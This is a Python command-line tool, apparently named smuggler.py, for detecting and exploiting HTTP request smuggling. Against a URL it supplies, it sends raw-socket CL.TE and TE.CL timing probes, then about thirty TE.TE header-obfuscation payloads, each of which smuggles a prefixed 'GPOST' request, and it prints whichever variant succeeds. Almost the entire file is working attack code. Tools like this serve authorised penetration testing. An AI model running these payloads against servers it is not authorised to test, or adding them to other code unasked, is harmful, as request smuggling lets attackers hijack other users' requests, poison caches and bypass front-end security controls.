import requests
import argparse
import sys
from fake_useragent import UserAgent
import time
import socket, ssl
from urllib.parse import urlparse


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class checkServer:
    agent = ''
    timeout = 7
    loop = 1
    tmp = 0
    
    def __init__(self, args):
        self.agent = args.agent
        timeout = args.timeout
    
    def start(self, url, req):
        if self.checkCLTE(url, req) == 0:
            # self.clear(url)
            if self.checkTECL(url, req) == 0:
                # self.clear(url)
                self.checkTETE(url, req)
                # if self.checkTETE(url, req) == 0:
                    # print(f"{bcolors.FAIL}[!] Can't know about server..{bcolors.ENDC}")
    
    def clear(self, url):
        requests.get(url, headers={"User-Agent" : self.agent})
    
    # Check server is CL.CL
    def checkCLCL(self):
        header_payload = {
            "Content-Length": ""
        }
    
    # Check server is CL.TE
    # Timing tech
    def checkCLTE(self, url, req):
        print("[*] Testing CL.TE...")
        
        urlInfo = urlparse(url)
        path = urlInfo.path if len(urlInfo.path) > 0 else "/"
        header = 'POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n'.format(path, urlInfo.netloc)
        data = '0\r\n\r\n\r\n'
        
        start = time.time()
        sendPayload(url, header, data)
        
        if time.time() - start >= self.timeout:
            self.printResult(header, data)
            return 1
        return 0
        
    # Check server is TE.CL
    # Timing tech
    def checkTECL(self, url, req):
        print("[*] Testing TE.CL...")
        
        urlInfo = urlparse(url)
        path = urlInfo.path if len(urlInfo.path) > 0 else "/"
        header = 'POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n'.format(path, urlInfo.netloc)
        data = '0\r\n\r\n\r\n'
        
        start = time.time()
        sendPayload(url, header, data)
        
        if time.time() - start >= self.timeout:
            self.printResult(header, data)
            return 1
        return 0
        
    # Check server is TE.TE    
    def checkTETE(self, url, req):
        print("[*] Testing TE.TE...")
        
        urlInfo = urlparse(url)
        path = urlInfo.path if len(urlInfo.path) > 0 else "/"
        
        payload = [ {
                "vulName" : "normal",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "space",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding : chunked\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "valueSpace",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding:  chunked\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "nospace",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding:chunked\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "tab",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding:\tchunked\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "vert",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding:\u000Bchunked\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "commaX",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked, x\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "Xcomma",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x, chunked\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "contentEnc",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nContent-Encoding: x\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "newline",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: \nchunked\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "newlineVal",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding\n : chunked\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "Singlequote",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: 'chunked'\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "Douquote",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: \"chunked\"\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "newlineVert",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: \n\u000Bx\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "newlineTab",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: \n\tx\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "dualChunk",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "chunk",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunk\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "multiCase",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cHuNkeD\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "uppercase",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: CHUNKED\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "\\r",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "tab\\r",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\t\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "Xdualchunk",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\nTransfer-Encoding: chunked\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "TEnewline",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer\r-Encoding: chunked\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "Dualnewline",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nFoo: x\n\nTransfer-Encoding: chunked\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "XCB",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x chunked bar\r\n\r\n".format(path, urlInfo.netloc),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "chr(255)",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding:{}chunked\r\n\r\n".format(path, urlInfo.netloc, chr(255)),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "chr(160)",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding:{}chunked\r\n\r\n".format(path, urlInfo.netloc, chr(160)),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "chr(130)",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfe{}r-Encoding: chunked\r\n\r\n".format(path, urlInfo.netloc, chr(130)),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            },{
                "vulName" : "chr(150)",
                "header" : "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chu{}nked\r\n\r\n".format(path, urlInfo.netloc, chr(150)),
                "data" : "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n"
            }
            
        ]
        
        for p in payload:
            for i in range(self.loop):
                sendPayload(url, p["header"], p["data"])
                
                # Send one normal request to test TETE.
                normal_header = 'POST {} HTTP/1.1\r\nHost: {}'.format(path, urlInfo.netloc)
                res = requests.post(url)
                
                # Check if request is smuggled.
                if res.text.find("GPOST") != -1:
                    self.printResult(p["header"], p["data"], p["vulName"])
                    self.tmp = 1
                    break
                    # return 1
        return 0
    
       
    def printResult(self, header, data, name = ''):
        if sys._getframe(1).f_code.co_name.find("TETE") == -1 and self.tmp == 0:
            print(f'{bcolors.WARNING}[*] Server using {sys._getframe(1).f_code.co_name.replace("check", "")[:4]}{bcolors.ENDC}')
        print(f"{bcolors.WARNING}>> {name}{bcolors.ENDC}")
        print(f"{bcolors.FAIL}====== payload ======")
        print(header + data, end="")
        print(f"======================{bcolors.ENDC}\n\n")

def banner():
	print("""
                                         _                             
         ___ _ __ ___  _   _  __ _  __ _| | ___ _ __       _ __  _   _ 
        / __| '_ ` _ \| | | |/ _` |/ _` | |/ _ \ '__|     | '_ \| | | |
        \__ \ | | | | | |_| | (_| | (_| | |  __/ |     _  | |_) | |_| |
        |___/_| |_| |_|\__,_|\__, |\__, |_|\___|_|    (_) | .__/ \__, |
                             |___/ |___/                  |_|    |___/ 
                        by universe 
""")
	pass



# Reference
# https://stackoverflow.com/questions/28670835/python-socket-client-post-parameters
# https://stackoverflow.com/questions/32062925/python-socket-server-handle-https-request
def sendPayload(url, header, data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    parse = urlparse(url)
    
    if parse.scheme == "https":
        port = 443
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
        s = context.wrap_socket(s, server_hostname=parse.netloc)
    else:
        port = 80
    
    s.connect((parse.netloc, port))
    s.sendall(header.encode('iso-8859-1') + data.encode('ascii'))
    
    # If testing TETE, no recive data.
    if sys._getframe(1).f_code.co_name.find("TETE") != -1:
        return
    
    response = s.recv(50).decode('utf-8')
    status_code = response[:response.index("\r\n")]
    print("     └───> "+status_code)
    

# Generate fake user-agent
def generateUserAgent():
    print("[*] Generating fake user-agent...")
    useragent = UserAgent().chrome
    print("[*] Done.")
    return useragent

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description = "HTTP request Smuggler tools")
    
    parser.add_argument("--url", required=True, help="Input url. --url http://test.com")
    parser.add_argument("--agent", required=False, action="store_true", help="Generating random User-Agent. --agent")
    parser.add_argument("--timeout", required=False, default=7, type=int, help="Set timeout. Default: 7s. --timeout [time]")

    args = parser.parse_args()
    
    banner()
    
    if args.url == "" or args.url == None:
        print("[!] Input URL.")
        exit()
        
    if args.agent == True:
        args.agent = generateUserAgent()
    else:
        args.agent = "Smuggler test"
        
    r = requests.get(args.url)
    tester = checkServer(args)
    
    print("[*] Sending to {}".format(args.url))
    
    tester.start(args.url, r)